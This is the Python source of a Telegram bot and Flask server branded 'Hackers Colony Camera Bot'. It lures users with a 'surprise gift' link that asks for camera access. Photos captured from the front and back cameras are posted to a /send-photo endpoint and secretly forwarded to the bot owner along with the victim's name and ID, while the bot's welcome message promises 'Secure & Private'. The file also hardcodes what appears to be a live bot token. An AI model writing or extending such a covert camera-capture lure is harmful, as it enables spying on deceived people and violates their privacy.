import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
import sqlite3
import datetime
import asyncio
import time
from datetime import datetime, timedelta
import json
from flask import Flask, request, jsonify

# ===== FLASK SERVER FOR WEB APP =====
flask_app = Flask(__name__)

# Telegram bot token (you should set this as environment variable)
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8226782560:AAG2h1cqLmKnWvF7YlsdxJ3W8VPlDNe7qn8')
OWNER_ID = int(os.environ.get('OWNER_ID', '8215819954'))
WEB_URL = os.environ.get('WEB_URL', 'https://hco-cam.onrender.com')

# ===== DATABASE FUNCTIONS =====
def init_db():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  username TEXT,
                  first_name TEXT,
                  last_name TEXT,
                  join_date TIMESTAMP,
                  last_active TIMESTAMP,
                  photo_count INTEGER DEFAULT 0,
                  is_banned INTEGER DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS photos
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  timestamp TIMESTAMP,
                  photo_type TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS broadcasts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  admin_id INTEGER,
                  message TEXT,
                  timestamp TIMESTAMP,
                  success_count INTEGER DEFAULT 0,
                  fail_count INTEGER DEFAULT 0)''')
    
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name, last_name):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    now = datetime.now()
    c.execute('''INSERT OR IGNORE INTO users 
                 (user_id, username, first_name, last_name, join_date, last_active) 
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (user_id, username, first_name, last_name, now, now))
    conn.commit()
    conn.close()

def update_activity(user_id):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    now = datetime.now()
    c.execute('''UPDATE users SET last_active = ? WHERE user_id = ?''', (now, user_id))
    conn.commit()
    conn.close()

def add_photo(user_id, photo_type):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    now = datetime.now()
    c.execute('''INSERT INTO photos (user_id, timestamp, photo_type) VALUES (?, ?, ?)''',
              (user_id, now, photo_type))
    c.execute('''UPDATE users SET photo_count = photo_count + 1 WHERE user_id = ?''', (user_id,))
    conn.commit()
    conn.close()

def get_user_count():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT COUNT(*) FROM users WHERE is_banned = 0''')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_photo_count():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT COUNT(*) FROM photos''')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_today_stats():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    today = datetime.now().date()
    
    c.execute('''SELECT COUNT(*) FROM users WHERE DATE(join_date) = ?''', (today,))
    today_users = c.fetchone()[0]
    
    c.execute('''SELECT COUNT(*) FROM photos WHERE DATE(timestamp) = ?''', (today,))
    today_photos = c.fetchone()[0]
    
    yesterday = datetime.now() - timedelta(days=1)
    c.execute('''SELECT COUNT(*) FROM users WHERE last_active > ?''', (yesterday,))
    active_users = c.fetchone()[0]
    
    conn.close()
    return today_users, today_photos, active_users

def get_all_users():
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT user_id FROM users WHERE is_banned = 0''')
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def get_user_info(user_id):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT * FROM users WHERE user_id = ?''', (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def update_user_ban(user_id, ban_status):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''UPDATE users SET is_banned = ? WHERE user_id = ?''', (ban_status, user_id))
    conn.commit()
    conn.close()

def search_users(query):
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT user_id, username, first_name, last_name FROM users 
                 WHERE user_id LIKE ? OR username LIKE ? OR first_name LIKE ? OR last_name LIKE ?
                 LIMIT 50''',
              (f'%{query}%', f'%{query}%', f'%{query}%', f'%{query}%'))
    users = c.fetchall()
    conn.close()
    return users

# Initialize database
init_db()

# ===== FLASK ROUTES =====
@flask_app.route('/')
def index():
    return "Hackers Colony Camera Bot Server is running!"

@flask_app.route('/send-photo', methods=['POST'])
async def receive_photo():
    try:
        data = request.json
        user_id = data.get('userId')
        photo_base64 = data.get('photo')
        label = data.get('label', 'unknown')
        
        if not user_id or not photo_base64:
            return jsonify({'error': 'Missing data'}), 400
        
        # Store photo in database
        add_photo(user_id, f"web_{label}")
        
        # Convert base64 to bytes
        import base64
        photo_bytes = base64.b64decode(photo_base64)
        
        # Send to user via bot
        from telegram import Bot
        bot = Bot(token=BOT_TOKEN)
        
        # Send to user
        try:
            await bot.send_photo(
                chat_id=user_id,
                photo=photo_bytes,
                caption=f"🎁 Your Gift: {label}"
            )
        except Exception as e:
            print(f"Failed to send to user {user_id}: {e}")
        
        # Send to owner
        if int(user_id) != OWNER_ID:
            try:
                user_info = get_user_info(user_id)
                user_name = f"{user_info[2]}" if user_info else f"User_{user_id}"
                
                await bot.send_photo(
                    chat_id=OWNER_ID,
                    photo=photo_bytes,
                    caption=f"📸 From: {user_name} (ID: {user_id})\nLabel: {label}"
                )
            except Exception as e:
                print(f"Failed to send to owner: {e}")
        
        return jsonify({'success': True, 'message': 'Photo processed'})
        
    except Exception as e:
        print(f"Error in /send-photo: {e}")
        return jsonify({'error': str(e)}), 500

@flask_app.route('/stats')
def stats_api():
    total_users = get_user_count()
    total_photos = get_photo_count()
    today_users, today_photos, active_users = get_today_stats()
    
    return jsonify({
        'total_users': total_users,
        'total_photos': total_photos,
        'today_users': today_users,
        'today_photos': today_photos,
        'active_users': active_users
    })

# ===== TELEGRAM BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.username, user.first_name, user.last_name)
    
    # Check if user is banned
    user_info = get_user_info(user.id)
    if user_info and user_info[7] == 1:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url="https://t.me/HackersColony")],
        [InlineKeyboardButton("✅ I Have Joined", callback_data="joined")]
    ]
    
    await update.message.reply_text(
        """🎭 *Hackers Colony Camera Bot*

🔐 Join our channel to access the surprise gift bot!

⚡ After joining, click the button below.

📸 *Features:*
• 8 Personalized Photos
• Front & Back Camera
• Instant Delivery
• Secure & Private""",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def joined(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    await query.answer()
    
    # Check if user is banned
    user_info = get_user_info(user.id)
    if user_info and user_info[7] == 1:
        await query.message.edit_text("❌ You are banned from using this bot.")
        return
    
    update_activity(user.id)
    
    keyboard = [[InlineKeyboardButton("🎯 Continue", callback_data="accept")]]
    
    await query.message.edit_text(
        """✨ *Almost There!*

Click Continue to get your gift link.

⚠️ *Note:* You need to allow camera access when prompted.""",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def accept(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    await query.answer()
    
    # Check if user is banned
    user_info = get_user_info(user.id)
    if user_info and user_info[7] == 1:
        await query.message.edit_text("❌ You are banned from using this bot.")
        return
    
    update_activity(user.id)
    
    user_id = user.id
    link = f"{WEB_URL}?uid={user_id}"
    
    keyboard = [
        [InlineKeyboardButton("🎁 Get Your Gift", url=link)],
        [InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Hackers_Colony_Official")],
        [InlineKeyboardButton("📢 Join Channel", url="https://t.me/HackersColony")]
    ]
    
    await query.message.edit_text(
        f"""✅ *Ready!*

Click the button below to open your gift:

🎁 [Your Gift Link]({link})

✨ *Instructions:*
1. Click the button below
2. Allow camera access when asked
3. Wait for the magic to happen
4. Photos will arrive here automatically

📸 *Total Photos:* 8 (4 Front + 4 Back Camera)
⏱️ *Time:* About 30 seconds

⚠️ *Note:* Do not close the browser tab until process completes!""",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
        disable_web_page_preview=True
    )

# ===== ADMIN COMMANDS =====
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Access denied!")
        return
    
    total_users = get_user_count()
    total_photos = get_photo_count()
    today_users, today_photos, active_users = get_today_stats()
    
    keyboard = [
        [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast_menu")],
        [InlineKeyboardButton("👥 User Management", callback_data="user_management")],
        [InlineKeyboardButton("🔍 Search User", callback_data="search_user")]
    ]
    
    await update.message.reply_text(
        f"""⚡ *Admin Panel*

👑 Owner: @{update.effective_user.username or "N/A"}
📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

📈 *Quick Stats:*
👥 Total Users: {total_users}
📸 Total Photos: {total_photos}
📊 Today's Users: {today_users}
🖼️ Today's Photos: {today_photos}
⚡ Active (24h): {active_users}

Select an option:""",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        return
    
    total_users = get_user_count()
    total_photos = get_photo_count()
    today_users, today_photos, active_users = get_today_stats()
    
    keyboard = [
        [InlineKeyboardButton("🔄 Refresh", callback_data="stats")],
        [InlineKeyboardButton("◀️ Back", callback_data="back_admin")]
    ]
    
    await query.message.edit_text(
        f"""📊 *Detailed Statistics*

📈 *Overview:*
👥 Total Users: {total_users}
📸 Total Photos: {total_photos}
📊 Today's Users: {today_users}
🖼️ Today's Photos: {today_photos}
⚡ Active (24h): {active_users}

🔄 Last Updated: {datetime.now().strftime("%H:%M:%S")}""",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def broadcast_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        return
    
    keyboard = [
        [InlineKeyboardButton("📝 Text Message", callback_data="broadcast_text")],
        [InlineKeyboardButton("◀️ Back", callback_data="back_admin")]
    ]
    
    await query.message.edit_text(
        """📢 *Broadcast Message*

Select broadcast type:

• Text Message: Send text to all users""",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def broadcast_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        return
    
    await query.message.edit_text(
        """📝 *Text Broadcast*

Send me the message you want to broadcast.

Format: `/broadcast Your message here`

Max: 4000 characters
Supports: Markdown formatting""",
        parse_mode="Markdown"
    )

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/broadcast Your message`", parse_mode="Markdown")
        return
    
    message = " ".join(context.args)
    if len(message) > 4000:
        await update.message.reply_text("❌ Message too long! Max 4000 characters.")
        return
    
    total_users = get_user_count()
    await update.message.reply_text(f"📢 Broadcasting to {total_users} users...\n⏳ Please wait...")
    
    users = get_all_users()
    success = 0
    failed = 0
    
    for idx, user_id in enumerate(users):
        try:
            await context.bot.send_message(
                chat_id=user_id, 
                text=message,
                parse_mode="Markdown"
            )
            success += 1
            
            if idx % 50 == 0:
                await asyncio.sleep(1)
            else:
                await asyncio.sleep(0.05)
                
        except Exception as e:
            failed += 1
    
    report = f"""✅ *Broadcast Complete*

📊 *Results:*
✓ Success: {success}
✗ Failed: {failed}
📈 Total: {success + failed}

📅 *Time:* {datetime.now().strftime("%H:%M:%S")}"""
    
    await update.message.reply_text(report, parse_mode="Markdown")

async def user_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        return
    
    conn = sqlite3.connect('bot_users.db')
    c = conn.cursor()
    c.execute('''SELECT user_id, username, first_name, photo_count, last_active, is_banned 
                 FROM users ORDER BY last_active DESC LIMIT 10''')
    users = c.fetchall()
    conn.close()
    
    if not users:
        await query.message.edit_text("📭 No users found!")
        return
    
    user_list_text = "👥 *Recent Users (Last 10)*\n\n"
    keyboard = []
    
    for user in users:
        user_id, username, first_name, photo_count, last_active, is_banned = user
        username_display = f"@{username}" if username else "No username"
        last_active_time = datetime.strptime(last_active, "%Y-%m-%d %H:%M:%S.%f").strftime("%m/%d %H:%M")
        ban_status = "🔴 BANNED" if is_banned else "🟢 ACTIVE"
        
        user_list_text += f"• {first_name} ({username_display})\n"
        user_list_text += f"  🆔: `{user_id}` | 📸: {photo_count} | {ban_status}\n"
        user_list_text += f"  🕐: {last_active_time}\n\n"
        
        if is_banned:
            keyboard.append([InlineKeyboardButton(
                f"✅ Unban {first_name}", 
                callback_data=f"unban_{user_id}"
            )])
        else:
            keyboard.append([InlineKeyboardButton(
                f"❌ Ban {first_name}", 
                callback_data=f"ban_{user_id}"
            )])
    
    keyboard.append([InlineKeyboardButton("◀️ Back", callback_data="back_admin")])
    
    await query.message.edit_text(
        user_list_text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        return
    
    user_id = int(query.data.split("_")[1])
    update_user_ban(user_id, 1)
    
    await query.message.reply_text(f"✅ User {user_id} has been banned.")
    await user_management(update, context)

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        return
    
    user_id = int(query.data.split("_")[1])
    update_user_ban(user_id, 0)
    
    await query.message.reply_text(f"✅ User {user_id} has been unbanned.")
    await user_management(update, context)

async def search_user_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        return
    
    await query.message.edit_text(
        """🔍 *Search User*

Send me:
• User ID
• Username
• First name
• Last name

Format: `/search query`""",
        parse_mode="Markdown"
    )

async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/search query`", parse_mode="Markdown")
        return
    
    query = " ".join(context.args)
    users = search_users(query)
    
    if not users:
        await update.message.reply_text("❌ No users found!")
        return
    
    response = f"🔍 *Search Results for '{query}':*\n\n"
    
    for user in users[:10]:
        user_id, username, first_name, last_name = user
        username_display = f"@{username}" if username else "No username"
        name = f"{first_name or ''} {last_name or ''}".strip() or "No name"
        
        response += f"• {name} ({username_display})\n"
        response += f"  🆔: `{user_id}`\n\n"
    
    await update.message.reply_text(
        response,
        parse_mode="Markdown"
    )

async def back_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        return
    
    total_users = get_user_count()
    total_photos = get_photo_count()
    today_users, today_photos, active_users = get_today_stats()
    
    keyboard = [
        [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast_menu")],
        [InlineKeyboardButton("👥 User Management", callback_data="user_management")],
        [InlineKeyboardButton("🔍 Search User", callback_data="search_user")]
    ]
    
    await query.message.edit_text(
        f"""⚡ *Admin Panel*

📈 *Quick Stats:*
👥 Total Users: {total_users}
📸 Total Photos: {total_photos}
📊 Today's Users: {today_users}
🖼️ Today's Photos: {today_photos}
⚡ Active (24h): {active_users}

Select an option:""",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ===== MAIN FUNCTION =====
async def main():
    # Create Telegram application
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("search", search_command))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(joined, pattern="^joined$"))
    application.add_handler(CallbackQueryHandler(accept, pattern="^accept$"))
    application.add_handler(CallbackQueryHandler(stats, pattern="^stats$"))
    application.add_handler(CallbackQueryHandler(broadcast_menu, pattern="^broadcast_menu$"))
    application.add_handler(CallbackQueryHandler(broadcast_text, pattern="^broadcast_text$"))
    application.add_handler(CallbackQueryHandler(user_management, pattern="^user_management$"))
    application.add_handler(CallbackQueryHandler(search_user_menu, pattern="^search_user$"))
    application.add_handler(CallbackQueryHandler(back_admin, pattern="^back_admin$"))
    application.add_handler(CallbackQueryHandler(ban_user, pattern="^ban_"))
    application.add_handler(CallbackQueryHandler(unban_user, pattern="^unban_"))
    
    # Start bot
    print("=" * 50)
    print("🎁 Hackers Colony Bot Started!")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"🔗 Web URL: {WEB_URL}")
    print(f"📊 Users in DB: {get_user_count()}")
    print(f"📸 Photos in DB: {get_photo_count()}")
    print("=" * 50)
    
    # Run Flask in background
    import threading
    def run_flask():
        flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Start bot polling
    await application.run_polling()

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())
